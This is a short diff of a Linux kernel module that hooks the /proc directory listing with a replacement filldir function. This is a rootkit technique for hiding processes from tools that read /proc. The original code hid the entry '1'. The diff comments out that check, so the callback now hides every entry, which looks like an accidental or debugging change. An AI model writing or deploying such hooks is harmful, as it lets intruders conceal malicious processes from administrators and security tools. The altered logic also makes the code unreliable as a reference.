@@ -1,15 +1,16 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/proc_fs.h>
+#include <linux/string.h>
 
 static struct proc_dir_entry *root;
-static struct file_operations *fops;
 static struct file_operations *root_fops;
 static int (*old_proc_readdir)(struct file *, void *, filldir_t);
 static filldir_t old_filldir;
 
 static int new_filldir(void *__buf, const char *name, int namelen,
 	loff_t offset, u64 ino, unsigned d_type) {
-    if (!strcmp(name, "1"))
+    //if (!strcmp(name, "1"))
 	return 0;
     return old_filldir(__buf, name, namelen, offset, ino, d_type);
 }
